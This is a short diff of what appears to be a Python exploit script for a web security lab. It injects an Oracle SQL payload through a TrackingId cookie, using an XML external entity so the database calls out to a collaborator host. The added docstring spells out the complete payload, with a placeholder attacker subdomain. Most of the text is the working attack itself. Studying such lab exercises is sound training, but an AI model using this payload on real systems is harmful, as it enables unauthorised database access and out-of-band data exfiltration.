@@ -46,7 +46,11 @@ def main(args):
           "<!DOCTYPE root [ <!ENTITY % remote SYSTEM" 
           f"\"http://{args.collab}/\">"
           " %remote;]>'),'/l') FROM dual-- "
-)    
+)   
+    
+    """
+    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+    """
     exploit_encoded = urllib.parse.quote(exploit)
     cookies = {
         "TrackingId": exploit_encoded,
